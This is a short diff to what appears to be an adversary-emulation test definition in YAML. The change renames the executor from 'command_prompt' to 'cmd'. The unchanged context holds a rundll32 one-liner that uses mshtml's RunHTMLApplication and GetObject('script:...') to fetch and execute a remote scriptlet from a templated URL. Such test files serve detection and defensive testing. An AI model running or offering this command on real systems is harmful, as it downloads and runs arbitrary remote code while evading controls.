@@ -20,8 +20,8 @@ steps:
     - name: rundll32-execute-javascript-remote-payload-with-getobject
       inline: |
         rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{{.Args.file_url}}").Exec();window.close();
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             taskkill /IM notepad.exe /f
-        executor: command_prompt
+        executor: cmd
